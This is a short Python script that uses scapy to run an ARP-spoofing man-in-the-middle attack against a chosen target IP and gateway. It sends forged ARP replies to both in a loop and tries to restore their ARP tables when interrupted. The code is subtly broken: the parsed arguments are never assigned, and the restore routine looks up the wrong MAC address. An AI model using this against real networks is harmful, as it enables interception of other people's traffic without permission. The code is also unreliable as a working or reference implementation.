#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time

# get flag arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="target IP / IP range")
    parser.add_argument("-g", "--gateway", dest="gateway", help="gateway IP")
    options = parser.parse_args()
    return options

# function to find mac for a specific ip
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered_list[0][1].hwsrc

# arp spoof
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# arp restore
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    
# main
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] packets sent: " + str(sent_packets_count), end="")    # print from start of line \r
        time.sleep(2)
except KeyboardInterrupt:
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("[+] Quitting...Resetting...")
    
    
    
